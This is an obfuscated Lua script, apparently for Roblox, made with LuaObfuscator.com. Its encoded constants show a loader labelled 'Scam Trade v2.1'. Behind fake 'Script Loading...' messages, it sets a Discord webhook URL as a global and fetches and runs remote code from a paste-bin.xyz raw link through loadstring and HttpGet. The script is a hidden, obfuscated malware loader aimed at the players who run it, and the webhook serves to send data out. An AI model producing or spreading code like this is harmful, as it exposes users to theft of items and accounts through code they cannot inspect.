--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v70=v2(v0(v30,16));if v19 then local v77=v5(v70,v19);v19=nil;return v77;else return v70;end end end);local function v20(v31,v32,v33)if v33 then local v71=0 -0 ;local v72;while true do if (v71==((0 + 0) -0)) then v72=(v31/((3 -1)^(v32-(878 -(282 + 595)))))%(2^(((v33-((1639 -(1523 + 114)) -1)) -(v32-(620 -(555 + 64)))) + (932 -(857 + 74)))) ;return v72-(v72%(569 -(330 + 37 + (286 -85)))) ;end end else local v73=2^(v32-1) ;return (((v31%(v73 + v73))>=v73) and ((1993 -(68 + 997)) -(214 + 713))) or (0 + 0) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=1270 -(226 + 1044) ;local v36;local v37;while true do if (v35==(4 -(7 -4))) then return (v37 * (373 -((58 -26) + 85))) + v36 ;end if (v35==0) then v36,v37=v1(v16,v18,v18 + 2 + 0 );v18=v18 + 1 + (1 -0) ;v35=958 -(892 + 65) ;end end end local function v23()local v38=0;local v39;local v40;local v41;local v42;while true do if (v38==1) then return (v42 * (16777566 -(87 + 263))) + (v41 * (65716 -(67 + (1065 -(802 + 150))))) + (v40 * (188 + 68)) + v39 ;end if (v38==(0 -0)) then v39,v40,v41,v42=v1(v16,v18,v18 + 3 );v18=v18 + (7 -4) + 1 ;v38=3 -2 ;end end end local function v24()local v43=0 -0 ;local v44;local v45;local v46;local v47;local v48;local v49;while true do if (v43==(1 + 0)) then v46=998 -(915 + 82) ;v47=(v20(v45,2 -1 ,12 + (29 -21) ) * ((2 -0)^(1219 -(1069 + 118)))) + v44 ;v43=4 -(887 -(261 + 624)) ;end if (v43==(3 -1)) then v48=v20(v45,4 + 17 ,54 -23 );v49=((v20(v45,(113 -81) + 0 )==(792 -(368 + 423))) and  -(3 -2)) or (19 -(10 + 8)) ;v43=(870 -(814 + 45)) -8 ;end if (v43==((1088 -646) -(416 + 26))) then v44=v23();v45=v23();v43=3 -(1 + 1) ;end if (v43==(1 + 1 + 1)) then if (v48==(0 -0)) then if (v47==(438 -(145 + 293))) then return v49 * 0 ;else v48=431 -(44 + 386) ;v46=1486 -(998 + 488) ;end elseif (v48==(651 + 1396)) then return ((v47==(0 + 0)) and (v49 * (((1373 -600) -((1281 -(1020 + 60)) + 571))/(1138 -(116 + 1022))))) or (v49 * NaN) ;end return v8(v49,v48-(4258 -3235) ) * (v46 + (v47/((2 + 0)^52))) ;end end end local function v25(v50)local v51=(1292 + 131) -(630 + 793) ;local v52;local v53;while true do if (v51==((1735 -967) -((2158 -(447 + 966)) + 21))) then v53={};for v78=1 + (0 -0) , #v52 do v53[v78]=v2(v1(v3(v52,v78,v78)));end v51=9 -6 ;end if ((14 -(1828 -(1703 + 114)))==v51) then return v6(v53);end if (v51==(1 + 0)) then v52=v3(v16,v18,(v18 + v50) -1 );v18=v18 + v50 ;v51=(703 -(376 + 325)) + 0 ;end if (v51==(0 -0)) then v52=nil;if  not v50 then v50=v23();if (v50==(1055 -(87 + 968))) then return "";end end v51=1748 -(760 + 987) ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v54=0 + 0 ;local v55;local v56;local v57;local v58;local v59;local v60;while true do local v68=0 + 0 ;local v69;while true do if (v68~=0) then else v69=0;while true do if ((0 + 0)==v69) then if ((0 + 0)~=v54) then else v55={};v56={};v57={};v58={v55,v56,nil,v57};v54=1385 -(746 + 638) ;end if (v54==(1 + 1)) then local v102=0 -0 ;while true do if ((342 -(218 + 123))~=v102) then else return v58;end if (v102~=(1581 -(1535 + 46))) then else for v106=1,v23() do local v107=0 + 0 ;local v108;local v109;local v110;while true do if (v107==(1122 -(118 + 1003))) then v110=nil;while true do if ((0 + 0)~=v108) then else local v160=377 -(142 + 235) ;while true do if (v160==(561 -(306 + 254))) then v108=1 + 0 ;break;end if (v160==(0 + 0)) then v109=0 -0 ;v110=nil;v160=1468 -(899 + 568) ;end end end if (v108==(1 + 0)) then while true do if (v109==(0 -0)) then v110=v21();if (v20(v110,1,604 -(268 + 335) )==(290 -(60 + 230))) then local v202=572 -(426 + 146) ;local v203;local v204;local v205;local v206;local v207;while true do if ((0 + 0)~=v202) then else v203=0;v204=nil;v202=1457 -(282 + 1174) ;end if (v202==1) then v205=nil;v206=nil;v202=2 + 0 ;end if (v202==(813 -(569 + 242))) then v207=nil;while true do if (v203==(0 + 0)) then local v210=0;while true do if (v210==(0 + 0)) then v204=0;v205=nil;v210=2 -1 ;end if (v210~=(1 + 0)) then else v203=1;break;end end end if (2==v203) then while true do if (v204==(1026 -(706 + 318))) then local v211=1251 -(721 + 530) ;local v212;while true do if (v211~=(1271 -(945 + 326))) then else v212=0;while true do if (v212==(2 -1)) then v204=3;break;end if ((0 + 0)==v212) then local v219=0 -0 ;while true do if ((753 -(239 + 514))==v219) then if (v20(v206,2 -1 ,1 + 0 )==(1 + 0)) then v207[702 -(271 + 429) ]=v60[v207[2]];end if (v20(v206,2 + 0 ,2 + 0 )~=1) then else v207[3]=v60[v207[1503 -(1408 + 92) ]];end v219=1;end if (v219~=(2 -1)) then else v212=1087 -(461 + 625) ;break;end end end end break;end end end if (v204==3) then if (v20(v206,1291 -(993 + 295) ,1 + 2 )~=(1172 -(418 + 753))) then else v207[2 + 2 ]=v60[v207[4]];end v55[v106]=v207;break;end if (v204==(1 + 0)) then local v214=0;while true do if (v214==(1 + 0)) then v204=2;break;end if (v214~=0) then else v207={v22(),v22(),nil,nil};if (v205==(1769 -(1749 + 20))) then local v217=0 -0 ;local v218;while true do if (v217==(0 + 0)) then v218=0;while true do if ((1322 -(1249 + 73))~=v218) then else v207[3]=v22();v207[242 -(64 + 174) ]=v22();break;end end break;end end elseif (v205==(1 + 0)) then v207[3]=v23();elseif (v205==(1147 -(466 + 679))) then v207[6 -3 ]=v23() -((5 -3)^16) ;elseif (v205~=(1903 -(106 + 1794))) then else local v228=0 + 0 ;local v229;while true do if ((0 + 0)==v228) then v229=0 -0 ;while true do if ((0 + 0)~=v229) then else v207[3]=v23() -(2^(46 -30)) ;v207[220 -(42 + 174) ]=v22();break;end end break;end end end v214=2 -1 ;end end end if (v204==(114 -(4 + 110))) then v205=v20(v110,586 -(57 + 527) ,1507 -(363 + 1141) );v206=v20(v110,1431 -(41 + 1386) ,6);v204=104 -(17 + 86) ;end end break;end if (v203==(1581 -(1183 + 397))) then v206=nil;v207=nil;v203=2 + 0 ;end end break;end end end break;end end break;end end break;end if (v107==(0 -0)) then v108=0;v109=nil;v107=1 + 0 ;end end end for v111=1 + 0 ,v23() do v56[v111-(2 -1) ]=v28();end v102=1;end end end v69=1;end if (v69==1) then if (v54~=(167 -(122 + 44))) then else local v103=0 -0 ;while true do if (v103==(5 -3)) then v54=6 -4 ;break;end if ((1 + 0)==v103) then local v104=0 + 0 ;while true do if (0~=v104) then else for v114=1662 -(1477 + 184) ,v59 do local v115=0;local v116;local v117;local v118;local v119;while true do if (v115==(2 -0)) then while true do if ((0 + 0)~=v116) then else local v199=0 -0 ;while true do if (0==v199) then v117=0;v118=nil;v199=66 -(30 + 35) ;end if (v199==(1 -0)) then v116=1 + 0 ;break;end end end if (v116==(2 -1)) then v119=nil;while true do if (v117==0) then local v208=1257 -(1043 + 214) ;while true do if ((3 -2)==v208) then v117=1213 -(323 + 889) ;break;end if ((0 -0)==v208) then v118=v21();v119=nil;v208=581 -(361 + 219) ;end end end if (1==v117) then if (v118==(1 + 0)) then v119=v21()~=(476 -(41 + 435)) ;elseif (v118==(322 -(53 + 267))) then v119=v24();elseif (v118~=(3 + 0)) then else v119=v25();end v60[v114]=v119;break;end end break;end end break;end if (v115~=(0 + 0)) then else v116=413 -(15 + 398) ;v117=nil;v115=1;end if (v115==(1126 -(936 + 189))) then v118=nil;v119=nil;v115=984 -(18 + 964) ;end end end v58[11 -8 ]=v21();v104=1 + 0 ;end if (v104~=1) then else v103=2 + 0 ;break;end end end if ((850 -(20 + 830))==v103) then local v105=0 + 0 ;while true do if (v105~=0) then else v59=v23();v60={};v105=1614 -(1565 + 48) ;end if (v105~=1) then else v103=127 -(116 + 10) ;break;end end end end end break;end end break;end end end end local function v29(v61,v62,v63)local v64=0;local v65;local v66;local v67;while true do if (v64==0) then v65=v61[1];v66=v61[2];v64=1;end if (v64==1) then v67=v61[3];return function(...)local v80=v65;local v81=v66;local v82=v67;local v83=v27;local v84=1;local v85= -1;local v86={};local v87={...};local v88=v12("#",...) -1 ;local v89={};local v90={};for v94=0,v88 do if (v94>=v82) then v86[v94-v82 ]=v87[v94 + 1 ];else v90[v94]=v87[v94 + 1 ];end end local v91=(v88-v82) + 1 ;local v92;local v93;while true do local v95=0;while true do if (v95==0) then v92=v80[v84];v93=v92[1];v95=1;end if (v95==1) then if (v93<=7) then if (v93<=3) then if (v93<=1) then if (v93>0) then v90[v92[2]]();else v90[v92[2]]=v63[v92[3]];end elseif (v93>2) then local v122=v92[2];local v123=v90[v92[3]];v90[v122 + 1 ]=v123;v90[v122]=v123[v92[4]];else do return;end end elseif (v93<=5) then if (v93==4) then local v127=0;while true do if (v127==2) then v63[v92[3]]=v90[v92[2]];v84=v84 + 1 ;v92=v80[v84];v127=3;end if (v127==0) then v63[v92[3]]=v90[v92[2]];v84=v84 + 1 ;v92=v80[v84];v127=1;end if (v127==4) then v84=v92[3];break;end if (v127==1) then v90[v92[2]]=v92[3];v84=v84 + 1 ;v92=v80[v84];v127=2;end if (v127==3) then v90[v92[2]]=v92[3];v84=v84 + 1 ;v92=v80[v84];v127=4;end end else v63[v92[3]]=v90[v92[2]];end elseif (v93==6) then local v130=0;local v131;local v132;local v133;local v134;local v135;while true do if (1==v130) then v92=v80[v84];v90[v92[2]]=v63[v92[3]];v84=v84 + 1 ;v92=v80[v84];v90[v92[2]]=v63[v92[3]];v84=v84 + 1 ;v130=2;end if (v130==5) then v84=v84 + 1 ;v92=v80[v84];v135=v92[2];v90[v135]=v90[v135](v13(v90,v135 + 1 ,v85));v84=v84 + 1 ;v92=v80[v84];v130=6;end if (v130==0) then v131=nil;v132,v133=nil;v134=nil;v135=nil;v90[v92[2]][v92[3]]=v92[4];v84=v84 + 1 ;v130=1;end if (v130==3) then v92=v80[v84];v90[v92[2]]=v92[3];v84=v84 + 1 ;v92=v80[v84];v90[v92[2]]=v92[3]~=0 ;v84=v84 + 1 ;v130=4;end if (v130==4) then v92=v80[v84];v135=v92[2];v132,v133=v83(v90[v135](v13(v90,v135 + 1 ,v92[3])));v85=(v133 + v135) -1 ;v131=0;for v197=v135,v85 do local v198=0;while true do if (v198==0) then v131=v131 + 1 ;v90[v197]=v132[v131];break;end end end v130=5;end if (v130==6) then v90[v92[2]]();v84=v84 + 1 ;v92=v80[v84];v84=v92[3];break;end if (v130==2) then v92=v80[v84];v135=v92[2];v134=v90[v92[3]];v90[v135 + 1 ]=v134;v90[v135]=v134[v92[4]];v84=v84 + 1 ;v130=3;end end else v90[v92[2]][v92[3]]=v92[4];v84=v84 + 1 ;v92=v80[v84];v90[v92[2]]=v63[v92[3]];v84=v84 + 1 ;v92=v80[v84];v90[v92[2]][v92[3]]=v92[4];v84=v84 + 1 ;v92=v80[v84];v90[v92[2]]=v92[3];v84=v84 + 1 ;v92=v80[v84];v84=v92[3];end elseif (v93<=11) then if (v93<=9) then if (v93>8) then v84=v92[3];else local v143=v92[2];local v144,v145=v83(v90[v143](v13(v90,v143 + 1 ,v92[3])));v85=(v145 + v143) -1 ;local v146=0;for v154=v143,v85 do v146=v146 + 1 ;v90[v154]=v144[v146];end end elseif (v93==10) then for v157=v92[2],v92[3] do v90[v157]=nil;end else local v147=0;local v148;while true do if (0==v147) then v148=v92[2];v90[v148]=v90[v148](v13(v90,v148 + 1 ,v85));break;end end end elseif (v93<=13) then if (v93>12) then v90[v92[2]]=v92[3]~=0 ;elseif (v90[v92[2]]==v92[4]) then v84=v84 + 1 ;else v84=v92[3];end elseif (v93==14) then v90[v92[2]]=v92[3];else v90[v92[2]][v92[3]]=v92[4];end v84=v84 + 1 ;break;end end end end;end end end return v29(v28(),{},v17)(...);end v15("LOL!173O00028O00027O004003023O005F47030A3O005365636F6E645465787403113O00536372697074204C6F6164696E673O2E03093O00546869726454657874030E3O00416C6D6F737420446F6E653O2E026O000840026O00F03F03083O00557365724E616D6503093O00482O754B686F69303903073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F312O3031353039343832373538363O3832382F4763696C7A6E53586A53356B422O735339376146507564703547666142316953664861715A726455364D2D64632D36487379472O48357253315172413441757364485651030B3O0057616974696E6754696D65025O00C07240030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403203O00682O7470733A2O2F70617374652D62696E2E78797A2F7261772F39382O342O36030A3O005363726970744E616D65030F3O005363616D2054726164652076322E3103093O00466972737454657874030D3O00506C6561736520776169742O2E00333O00120E3O00014O000A000100013O00260C3O0002000100010004093O0002000100120E000100013O00260C0001000C000100020004093O000C000100122O000200033O00300F00020004000500122O000200033O00300F00020006000700120E000100083O00260C0001001B000100010004093O001B000100120E000200013O00260C00020013000100090004093O0013000100120E000100093O0004093O001B000100260C0002000F000100010004093O000F000100120E0003000B3O0012040003000A3O00122O0003000D3O00122O0003000C3O00122O000200093O00044O000F000100260C00010028000100080004093O0028000100122O000200033O0030060002000E000F00122O000200103O00122O000300113O00202O00030003001200122O000500136O000600016O000300066O00023O00024O00020001000100044O0032000100260C00010005000100090004093O0005000100122O000200033O00300700020014001500122O000200033O00302O00020016001700122O000100023O00044O000500010004093O003200010004093O000200012O00023O00017O00",v9(),...);end
